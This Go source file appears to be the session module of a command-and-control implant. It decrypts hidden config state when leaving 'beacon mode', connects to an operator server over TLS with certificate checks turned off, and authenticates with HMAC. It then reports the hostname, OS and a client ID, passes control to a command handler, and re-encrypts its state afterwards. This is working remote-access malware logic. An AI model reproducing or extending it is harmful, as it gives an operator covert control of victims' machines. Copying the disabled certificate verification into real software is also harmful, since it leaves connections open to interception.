package session

import (
	"crypto/hmac"
	"crypto/sha512"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"runtime"
	"src/Client/generic/config"
	"src/Client/generic/logger"
	"src/Client/session/protocol"
	"time"

	"github.com/google/uuid"
)

const (
	// ConnectionTimeout defines the timeout in seconds for establishing a connection.
	ConnectionTimeout = 10
)

// SessionHandler orchestrates the entire session lifecycle.
func SessionHandler() error {
	logger.Log("[SessionHandler] ========== SESSION HANDLER STARTED ==========")

	// Decrypt state if encrypted (coming from beacon mode or idle)
	if config.IsStateEncrypted() {
		logger.Log("[SessionHandler] State is encrypted, decrypting before session operations")
		if err := config.DecryptConfigState(); err != nil {
			logger.Error(fmt.Sprintf("[SessionHandler] CRITICAL: Failed to decrypt state: %v", err))
			return fmt.Errorf("failed to decrypt state: %w", err)
		}
		logger.Log("[SessionHandler] State decrypted successfully")
	} else {
		logger.Log("[SessionHandler] State is already decrypted")
	}

	if !isHMACKeySet() {
		logger.Error("[SessionHandler] HMAC key is not set")
		return fmt.Errorf("HMAC key is not set. Please provide it with the -hmac-key flag")
	}
	logger.Log("[SessionHandler] HMAC key validation passed")

	logger.Log("[SessionHandler] Session mode activated. Initiating connection and authentication.")

	logger.Log("[SessionHandler] Attempting to connect to server")
	conn, err := connectToServer()
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Connection failed: %v", err))
		return fmt.Errorf("failed to connect to server: %w", err)
	}
	defer func() {
		logger.Log("[SessionHandler] Closing connection")
		conn.Close()
		logger.Log("[SessionHandler] Connection closed")

		// Encrypt state when session ends (going idle)
		logger.Log("[SessionHandler] Encrypting state after session ends")
		if err := config.EncryptConfigState(); err != nil {
			logger.Error(fmt.Sprintf("[SessionHandler] Failed to encrypt state after session: %v", err))
		} else {
			logger.Log("[SessionHandler] State encrypted successfully after session")
		}
	}()
	// Get session address for logging
	sessionAddr, _ := config.GetSessionAddr()
	logger.Log(fmt.Sprintf("[SessionHandler] Successfully connected to %s", sessionAddr))

	logger.Log("[SessionHandler] Starting HMAC authentication")
	if err := performHMACAuthentication(conn); err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Authentication failed: %v", err))
		return fmt.Errorf("failed to authenticate: %w", err)
	}
	logger.Log("[SessionHandler] Server authentication successful.")

	logger.Log("[SessionHandler] Sending client information to server")
	if err := sendClientInfo(conn); err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to send client info: %v", err))
		return fmt.Errorf("failed to send client info: %w", err)
	}
	logger.Log("[SessionHandler] Client info sent successfully")

	logger.Log("[SessionHandler] Receiving initial data from server")
	_, _ = protocol.ReceiveData(conn) // place holder for shark listener
	logger.Log("[SessionHandler] Initial data received, starting command handler")

	commandHandler(conn)
	logger.Log("[SessionHandler] ========== SESSION HANDLER ENDED ==========")
	return nil
}

// isHMACKeySet checks if the HMAC key is provided and logs an error if not.
func isHMACKeySet() bool {
	logger.Log("[SessionHandler] Checking HMAC key availability")

	// Get HMAC key safely (auto-decrypts if needed)
	hmacKey, err := config.GetHMACKey()
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to get HMAC key: %v", err))
		return false
	}

	if hmacKey == "" {
		logger.Error("[SessionHandler] HMAC key is required. Please provide it with the -hmac-key flag.")
		return false
	}
	logger.Log("[SessionHandler] HMAC key is set")
	return true
}

// connectToServer establishes a TLS connection to the server.
func connectToServer() (*tls.Conn, error) {
	// Get session address safely (auto-decrypts if needed)
	sessionAddr, err := config.GetSessionAddr()
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to get session address: %v", err))
		return nil, fmt.Errorf("failed to get session address: %w", err)
	}

	logger.Log(fmt.Sprintf("[SessionHandler] Creating TLS connection to %s", sessionAddr))
	logger.Log(fmt.Sprintf("[SessionHandler] Connection timeout: %d seconds", ConnectionTimeout))
	tlsConfig := &tls.Config{InsecureSkipVerify: true}
	logger.Log("[SessionHandler] TLS config created (InsecureSkipVerify: true)")
	dialer := &net.Dialer{Timeout: ConnectionTimeout * time.Second}
	logger.Log("[SessionHandler] Dialing server...")
	conn, dialErr := tls.DialWithDialer(dialer, "tcp", sessionAddr, tlsConfig)
	if dialErr != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] TLS dial failed: %v", dialErr))
		return nil, dialErr
	}
	logger.Log("[SessionHandler] TLS connection established successfully")
	return conn, nil
}

// performHMACAuthentication handles the challenge-response flow.
func performHMACAuthentication(conn net.Conn) error {
	logger.Log("[SessionHandler] Starting HMAC challenge-response flow...")

	// Receive challenge from the server
	logger.Log("[SessionHandler] Waiting for challenge from server")
	challenge, err := protocol.ReceiveData(conn)
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to receive challenge: %v", err))
		return fmt.Errorf("failed to receive challenge: %w", err)
	}
	logger.Log(fmt.Sprintf("[SessionHandler] Received challenge from server (size: %d bytes)", len(challenge)))

	// Get HMAC key safely (auto-decrypts if needed)
	hmacKey, err := config.GetHMACKey()
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to get HMAC key: %v", err))
		return fmt.Errorf("failed to get HMAC key: %w", err)
	}

	// Compute and send the response
	logger.Log("[SessionHandler] Computing HMAC response")
	response := computeHMAC(challenge, []byte(hmacKey))
	logger.Log(fmt.Sprintf("[SessionHandler] HMAC response computed (size: %d bytes)", len(response)))
	logger.Log("[SessionHandler] Sending HMAC response to server")
	if err := protocol.SendData(conn, []byte(response)); err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to send response: %v", err))
		return fmt.Errorf("failed to send response: %w", err)
	}
	logger.Log("[SessionHandler] HMAC response sent successfully")

	return nil
}

// sendClientInfo gathers and transmits client system details to the server.
func sendClientInfo(conn net.Conn) error {
	logger.Log("[SessionHandler] Gathering and sending client information...")

	hostname := getHostname()
	os := getOS()
	clientID := getClientID()

	logger.Log(fmt.Sprintf("[SessionHandler] Hostname: %s", hostname))
	logger.Log(fmt.Sprintf("[SessionHandler] OS: %s", os))
	logger.Log(fmt.Sprintf("[SessionHandler] ClientID: %s", clientID))

	clientInfo := map[string]string{
		"Hostname": hostname,
		"OS":       os,
		"ID":       clientID,
	}

	logger.Log("[SessionHandler] Marshaling client info to JSON")
	infoJSON, err := json.Marshal(clientInfo)
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to marshal client info: %v", err))
		return fmt.Errorf("failed to marshal client info: %w", err)
	}
	logger.Log(fmt.Sprintf("[SessionHandler] Client info marshaled (size: %d bytes)", len(infoJSON)))

	logger.Log("[SessionHandler] Sending client info to server")
	if err := protocol.SendData(conn, infoJSON); err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Failed to send client info: %v", err))
		return fmt.Errorf("failed to send client info: %w", err)
	}
	logger.Log("[SessionHandler] Client information sent successfully.")
	return nil
}

// computeHMAC generates an HMAC-SHA512 hash.
func computeHMAC(data, key []byte) string {
	logger.Log(fmt.Sprintf("[SessionHandler] Computing HMAC-SHA512 (data size: %d, key size: %d)", len(data), len(key)))
	h := hmac.New(sha512.New, key)
	h.Write(data)
	result := hex.EncodeToString(h.Sum(nil))
	logger.Log(fmt.Sprintf("[SessionHandler] HMAC computed (result size: %d)", len(result)))
	return result
}

// getHostname retrieves the system's hostname.
func getHostname() string {
	logger.Log("[SessionHandler] Retrieving system hostname")
	hostname, err := os.Hostname()
	if err != nil {
		logger.Error(fmt.Sprintf("[SessionHandler] Could not retrieve hostname: %v", err))
		return "unknown"
	}
	logger.Log(fmt.Sprintf("[SessionHandler] Hostname retrieved: %s", hostname))
	return hostname
}

// getOS retrieves the operating system name.
func getOS() string {
	os := runtime.GOOS
	logger.Log(fmt.Sprintf("[SessionHandler] Operating system: %s", os))
	return os
}

// getClientID generates a unique client ID.
func getClientID() string {
	logger.Log("[SessionHandler] Generating unique client ID")
	id := uuid.New().String()
	logger.Log(fmt.Sprintf("[SessionHandler] Client ID generated: %s", id))
	return id
}
